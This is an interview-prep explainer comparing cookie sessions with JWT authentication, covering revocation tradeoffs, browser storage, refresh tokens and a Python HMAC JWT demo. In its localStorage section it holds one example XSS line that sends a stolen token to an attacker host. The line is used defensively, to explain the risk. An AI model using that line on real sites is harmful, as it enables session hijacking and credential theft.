---
id: 1-sessions-vs-jwt
title: "Cookie Sessions vs JWT Authentication"
description: "Compare cookie-based session authentication with token-based authentication (JWT), storage location, and scalability vs. revocation tradeoffs."
sidebar_position: 1
sidebar_class_name: sidebar-medium
---

import { Diagram, Row, Box, Field } from '@site/src/components/ConceptDiagram';

<span className="badge badge--warning margin-bottom--md">Medium</span>

> **Interview Question:** "Compare cookie-based session authentication with token-based authentication (JWT). Where is state stored in each approach, what is the architectural tradeoff between horizontal scalability and instantaneous revocation, and how do production systems mitigate JWT revocation and XSS vulnerabilities?"

Think of a coat check versus a membership card. A coat check gives you a ticket with a number on it — meaningless on its own, but the venue has a record of exactly whose coat it is, and can tear it up anytime. A membership card has your name and tier printed right on it, signed by the club so nobody can forge one — any staff member can glance at it and know you're a member, without calling the front desk.

Sessions are the coat-check ticket. JWTs are the membership card. That one difference — "server looks it up" vs. "server just checks the signature" — explains almost everything else about the two approaches.

---

### How the two actually work

<Diagram>
<Row>
<Box title="Session (stateful)" accent="#60a5fa">
<Field icon="🗄️" code="session_id → stored server-side" hint="cookie just holds an opaque ID" variant="neutral" />
</Box>
<Box title="JWT (stateless)" accent="#34d399">
<Field icon="🔏" code="claims + signature, self-contained" hint="server verifies, doesn't store anything" variant="neutral" />
</Box>
</Row>
</Diagram>

**1. Cookie-based sessions.** On login, the server generates a random `session_id`, stores a record of it (in Redis or a database table) with the user's identity, and sends that ID back as a cookie — ideally marked `HttpOnly; Secure; SameSite=Strict`. The browser attaches that cookie automatically on every future request. The server's only job on each request is: take the ID, look it up in Redis, see who it belongs to. The ID itself means nothing without that lookup.

**2. JWT (JSON Web Token, RFC 7519).** On login, the server builds a small JSON payload of claims (`user_id`, `roles`, `exp`), then signs it:

$$\text{JWT} = \text{Base64URL}(\text{Header}) + "." + \text{Base64URL}(\text{Payload}) + "." + \text{Signature}$$

```
Header:    {"alg": "HS256", "typ": "JWT"}
Payload:   {"sub": "usr_9921", "role": "admin", "exp": 1711824000}
Signature: HMACSHA256(
             base64UrlEncode(header) + "." + base64UrlEncode(payload),
             secret_key
           )
```

The server hands this token to the client and **saves nothing**. On every later request, the client sends `Authorization: Bearer <token>`, and whichever backend service receives it just checks the signature — pure math, no database call. If the signature checks out and `exp` hasn't passed, the claims inside are trusted immediately.

**Symmetric vs. asymmetric signing:** with `HS256`, one shared secret both signs and verifies — every service that checks tokens has to know it, so if any one of them leaks the secret, attackers can forge tokens for the whole system. With `RS256`/`ES256`, only the central auth server holds the private key; every other service gets just the public key, enough to verify but not to forge.

---

### The real tradeoff: scaling vs. revoking

| Dimension | Session (stateful) | JWT (stateless) |
| :--- | :--- | :--- |
| **Where the state lives** | Server-side (Redis / DB) | Inside the token itself |
| **Cost per request** | A network round-trip to Redis | A local signature check (microseconds) |
| **Scaling across servers** | Needs a shared Redis cluster every server can reach | Trivial — no server needs to coordinate with any other |
| **Revoking access right now** | Easy — delete the Redis key, user's locked out instantly | Hard — there's no record to delete; the token's valid until it expires |
| **Size on the wire** | Tiny — a 32-byte opaque ID | Bigger — 500–2000 bytes sent on every request |

That's the whole trade. Sessions need a lookup, so they can be killed instantly but need a shared store that has to scale with you. JWTs skip the lookup entirely, so they scale for free — but once issued, nothing short of waiting for expiry can take one back.

---

### Where should the token live in the browser?

**`localStorage` — vulnerable to XSS.** Any JavaScript running on the page can read `window.localStorage`. If the site has even one XSS hole (a compromised npm package, an unsanitized comment field), an attacker's injected script can just do:

```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
```

That's why storing access tokens in `localStorage` is discouraged for anything security-sensitive.

**`HttpOnly` cookies — vulnerable to CSRF instead.** Mark a cookie `HttpOnly` and page JavaScript can't read it at all via `document.cookie` — XSS can't steal it. But cookies get attached automatically to cross-origin requests too, which opens the door to CSRF (a malicious site making the browser fire a request that carries your cookies along). The fix is `SameSite=Lax`/`Strict` plus an anti-CSRF token.

So: `localStorage` trades CSRF-safety for XSS-risk, `HttpOnly` cookies trade XSS-safety for CSRF-risk. Neither is free.

---

### How production systems actually do it: two tokens

Real systems (OAuth 2.0 / OIDC) don't pick one of these — they use both, each for what it's good at:

1. **Short-lived access token (JWT, 5–15 min):** stateless, sent as `Authorization: Bearer`, checked locally by every service with zero database calls. If it's stolen, the attacker only has a few minutes.
2. **Long-lived refresh token (opaque string, 7–30 days):** stored server-side and sent only in a secure `HttpOnly` cookie. Used only to ask the auth server for a new access token.
3. **Revocation:** ban a user, and the server deletes their refresh token from Redis. Their current access token still works until it expires (at most ~10–15 minutes), but it can't be renewed after that — so access shuts off almost immediately, without needing every microservice to check a database on every request.

---

### Say this in the interview

*"Sessions store state server-side — the cookie is just an opaque ID, and every request costs a lookup, but you can revoke instantly. JWTs store state in the token itself, signed so it can't be tampered with — every request is a free local signature check with no lookup, but you can't revoke before it expires. Production systems get both: short-lived stateless JWTs for cheap per-request verification, and a long-lived stateful refresh token for actual revocation control."*

---

### Python: JWT signing and tamper detection

The script below implements the core mechanics of a JWT (HMAC-SHA256) — signing, verifying, catching a tampered payload, and enforcing expiry:

```python
"""
JSON Web Token (JWT) Cryptographic Signing & Validation Simulator
Demonstrates:
  1. Base64URL encoding of Header, Payload, and Signature (HS256)
  2. Cryptographic signature verification
  3. Detection of payload tampering
  4. Token expiration enforcement
"""

import hmac
import hashlib
import base64
import json
import time
from typing import Dict, Any, Tuple

class SimpleJWT:
    def __init__(self, secret_key: str):
        self.secret_key = secret_key.encode('utf-8')

    def _base64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

    def _base64url_decode(self, data_str: str) -> bytes:
        # Re-add padding if stripped
        padding = 4 - (len(data_str) % 4)
        if padding < 4:
            data_str += '=' * padding
        return base64.urlsafe_b64decode(data_str.encode('utf-8'))

    def encode(self, payload: Dict[str, Any], expires_in_seconds: int = 3600) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload_copy = dict(payload)
        payload_copy["exp"] = int(time.time()) + expires_in_seconds

        header_b64 = self._base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_b64 = self._base64url_encode(json.dumps(payload_copy, separators=(',', ':')).encode('utf-8'))

        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        signature = hmac.new(self.secret_key, signing_input, hashlib.sha256).digest()
        sig_b64 = self._base64url_encode(signature)

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    def decode(self, token: str) -> Tuple[bool, Any]:
        parts = token.split('.')
        if len(parts) != 3:
            return False, "Invalid token structure"

        header_b64, payload_b64, sig_b64 = parts
        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        expected_sig = hmac.new(self.secret_key, signing_input, hashlib.sha256).digest()
        actual_sig = self._base64url_decode(sig_b64)

        # Constant-time comparison to prevent timing attacks
        if not hmac.compare_digest(expected_sig, actual_sig):
            return False, "Signature verification failed (TAMPERED!)"

        payload_bytes = self._base64url_decode(payload_b64)
        payload = json.loads(payload_bytes.decode('utf-8'))

        if payload.get("exp", 0) < time.time():
            return False, "Token has expired"

        return True, payload


def main():
    print("=== JWT Signing & Verification Simulation ===\n")
    SECRET = "super_secret_enterprise_key_2026"
    jwt_engine = SimpleJWT(secret_key=SECRET)

    # 1. Create a valid token
    claims = {"user_id": "usr_99182", "role": "engineer", "org": "acme_corp"}
    token = jwt_engine.encode(claims, expires_in_seconds=60)
    print(f"Generated Token:\n{token}\n")

    # 2. Verify valid token
    is_valid, decoded_claims = jwt_engine.decode(token)
    print(f"Verification 1 (Legitimate Token):")
    print(f"  Valid? {is_valid} | Claims: {decoded_claims}")

    # 3. Simulate Hacker Tampering (Escalating role to 'admin' without secret key)
    parts = token.split('.')
    tampered_payload = {"user_id": "usr_99182", "role": "SUPER_ADMIN", "exp": int(time.time()) + 3600}
    tampered_b64 = jwt_engine._base64url_encode(json.dumps(tampered_payload).encode('utf-8'))
    tampered_token = f"{parts[0]}.{tampered_b64}.{parts[2]}"

    print(f"\nVerification 2 (Attacker modified role to SUPER_ADMIN):")
    is_valid_hack, err = jwt_engine.decode(tampered_token)
    print(f"  Valid? {is_valid_hack} | Error: {err}")

    # 4. Simulate Expired Token
    expired_token = jwt_engine.encode(claims, expires_in_seconds=-10)
    print(f"\nVerification 3 (Expired Token):")
    is_valid_exp, err_exp = jwt_engine.decode(expired_token)
    print(f"  Valid? {is_valid_exp} | Error: {err_exp}")

if __name__ == "__main__":
    main()
```
